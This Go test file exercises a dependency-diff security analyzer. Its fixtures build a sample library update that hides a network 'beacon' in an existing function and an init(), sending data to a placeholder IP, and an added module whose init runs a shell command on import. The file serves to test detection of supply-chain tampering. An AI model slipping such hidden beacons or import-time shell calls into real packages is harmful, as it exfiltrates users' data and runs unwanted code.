package api_test

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/BlackVectorOps/semantic_firewall/v5/pkg/api"
	"github.com/BlackVectorOps/semantic_firewall/v5/pkg/models"
)

// writeTree writes files under a new temporary directory and returns it.
func writeTree(t *testing.T, files map[string]string) string {
	t.Helper()
	dir := t.TempDir()
	for name, src := range files {
		p := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(src), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// appTree is a module example.com/app whose main imports the given
// packages, with each listed dependency module replaced by lib/<module>.
func appTree(t *testing.T, imports string, deps map[string]string, files map[string]string) string {
	t.Helper()
	gomod := "module example.com/app\n\ngo 1.22\n"
	all := map[string]string{"app/main.go": "package main\n\nimport (\n" + imports + ")\n\nfunc main() {}\n"}
	for mod, dir := range deps {
		gomod += "\nrequire " + mod + " v1.0.0\n\nreplace " + mod + " => ../lib/" + dir + "\n"
		all["lib/"+dir+"/go.mod"] = "module " + mod + "\n\ngo 1.22\n"
	}
	all["app/go.mod"] = gomod
	for k, v := range files {
		all[k] = v
	}
	return filepath.Join(writeTree(t, all), "app")
}

func findModule(t *testing.T, out *models.DepsDiffOutput, path string) models.ModuleDiff {
	t.Helper()
	for _, m := range out.Modules {
		if m.Path == path {
			return m
		}
	}
	t.Fatalf("module %s not in deps diff: %+v", path, out.Modules)
	return models.ModuleDiff{}
}

const codecV1 = `package codec

import "strings"

// Decode parses data.
func Decode(data []byte) string { return normalize(string(data)) }

func normalize(s string) string { return strings.TrimSpace(s) }
`

// A dependency update that hides a beacon behind an existing exported
// function and an initializer.
func TestDepsDiff_UpdatedModule(t *testing.T) {
	imports := "\t_ \"example.com/lib/codec\"\n"
	deps := map[string]string{"example.com/lib": "lib"}
	oldDir := appTree(t, imports, deps, map[string]string{"lib/lib/codec/codec.go": codecV1})
	newDir := appTree(t, imports, deps, map[string]string{
		"lib/lib/codec/codec.go": `package codec

import (
	"net"
	"strings"
)

// Decode parses data.
func Decode(data []byte) string { return normalize(string(data)) }

func normalize(s string) string {
	go beacon(s)
	return strings.TrimSpace(s)
}

func beacon(s string) {
	if c, err := net.Dial("tcp", "203.0.113.7:443"); err == nil {
		c.Write([]byte(s))
	}
}

func init() { go beacon("init") }
`,
		"lib/lib/codec/stub.s":       "#include \"textflag.h\"\n",
		"lib/lib/codec/link.go":      "package codec\n\nimport _ \"unsafe\"\n\n//go:linkname nanotime runtime.nanotime\nfunc nanotime() int64\n",
	})

	out, err := api.DepsDiff(oldDir, newDir)
	if err != nil {
		t.Fatalf("DepsDiff: %v", err)
	}
	m := findModule(t, out, "example.com/lib")
	if m.Status != models.ModuleUpdated {
		t.Errorf("status %q; want updated", m.Status)
	}
	reach := map[string]models.ReachChange{}
	for _, r := range m.Reach {
		reach[r.Function] = r
	}
	if r, ok := reach["example.com/lib/codec.Decode"]; !ok || r.RiskScore < models.RiskScoreHigh || len(r.Added) != 1 || r.Added[0] != "network" {
		t.Errorf("Decode reach = %+v; want network, high risk", r)
	}
	if r, ok := reach["example.com/lib/codec.init"]; !ok || r.RiskScore <= reach["example.com/lib/codec.Decode"].RiskScore {
		t.Errorf("init reach = %+v; want network, scored above Decode's", r)
	}
	kinds := map[string]models.FileChange{}
	for _, fc := range m.Unanalyzed {
		kinds[fc.Kind] = fc
	}
	if fc := kinds["linkname"]; fc.Change != "added" || fc.RiskScore < models.RiskScoreHigh {
		t.Errorf("linkname change = %+v; want added, high risk", fc)
	}
	if fc := kinds["assembly"]; fc.Change != "added" || fc.RiskScore == 0 || fc.RiskScore >= models.RiskScoreHigh {
		t.Errorf("assembly change = %+v; want added, below high risk", fc)
	}
	var beacon *models.FunctionDiff
	for _, p := range m.Packages {
		for i, f := range p.Functions {
			if f.Function == "beacon" {
				beacon = &p.Functions[i]
			}
		}
	}
	if beacon == nil || beacon.Status != models.StatusAdded || beacon.RiskScore < models.RiskScoreHigh {
		t.Errorf("beacon = %+v; want added, high risk", beacon)
	}
	if out.Summary.ModulesUpdated != 1 || out.Summary.HighRiskChanges < 4 {
		t.Errorf("summary = %+v; want 1 updated module, at least 4 high-risk changes", out.Summary)
	}
}

// A capability provider calling its own wrappers is doing its job: new
// syscall wrappers in a module named golang.org/x/sys are not escalations.
func TestDepsDiff_ProviderOwnTargets(t *testing.T) {
	imports := "\t_ \"golang.org/x/sys/unix\"\n"
	deps := map[string]string{"golang.org/x/sys": "sys"}
	v1 := "package unix\n\nfunc Syscall6(a, b, c, d, e, f, g uintptr) (uintptr, uintptr, uintptr) { return 0, 0, 0 }\n"
	oldDir := appTree(t, imports, deps, map[string]string{"lib/sys/unix/unix.go": v1})
	newDir := appTree(t, imports, deps, map[string]string{"lib/sys/unix/unix.go": v1 +
		"\nfunc Fsconfig(fd int) error { Syscall6(431, uintptr(fd), 0, 0, 0, 0, 0); return nil }\n"})
	out, err := api.DepsDiff(oldDir, newDir)
	if err != nil {
		t.Fatalf("DepsDiff: %v", err)
	}
	m := findModule(t, out, "golang.org/x/sys")
	if m.HighRiskChanges != 0 || len(m.Packages) != 1 || len(m.Packages[0].Functions) != 1 {
		t.Errorf("module = %+v; want one added function and no high-risk change", m)
	}
}

// A module only the new tree compiles is reported with what it can reach;
// an initializer that reaches a capability runs on import and is high-risk.
// A module whose code did not change is not reported.
func TestDepsDiff_AddedAndUnchangedModules(t *testing.T) {
	stable := map[string]string{"lib/stable/s/s.go": "package s\n\nfunc S() int { return 1 }\n"}
	oldDir := appTree(t, "\t_ \"example.com/stable/s\"\n", map[string]string{"example.com/stable": "stable"}, stable)
	newFiles := map[string]string{
		"lib/stable/s/s.go": stable["lib/stable/s/s.go"],
		"lib/evil/e/e.go":   "package e\n\nimport \"os/exec\"\n\nfunc init() { exec.Command(\"sh\", \"-c\", \"id\").Run() }\n\nfunc Version() string { return \"1\" }\n",
	}
	newDir := appTree(t, "\t_ \"example.com/stable/s\"\n\t_ \"example.com/evil/e\"\n",
		map[string]string{"example.com/stable": "stable", "example.com/evil": "evil"}, newFiles)
	out, err := api.DepsDiff(oldDir, newDir)
	if err != nil {
		t.Fatalf("DepsDiff: %v", err)
	}
	for _, m := range out.Modules {
		if m.Path == "example.com/stable" {
			t.Errorf("unchanged module reported: %+v", m)
		}
	}
	m := findModule(t, out, "example.com/evil")
	if m.Status != models.ModuleAdded || len(m.Capabilities) != 1 || m.Capabilities[0] != "exec" {
		t.Errorf("added module = %+v; want status added with capability exec", m)
	}
	if len(m.Reach) != 1 || m.Reach[0].Function != "example.com/evil/e.init" || m.Reach[0].RiskScore < models.RiskScoreHigh {
		t.Errorf("added module reach = %+v; want a high-risk init reach", m.Reach)
	}
	if out.Summary.ModulesAdded != 1 || out.Summary.ModulesUpdated != 0 {
		t.Errorf("summary = %+v; want 1 added, 0 updated", out.Summary)
	}
}
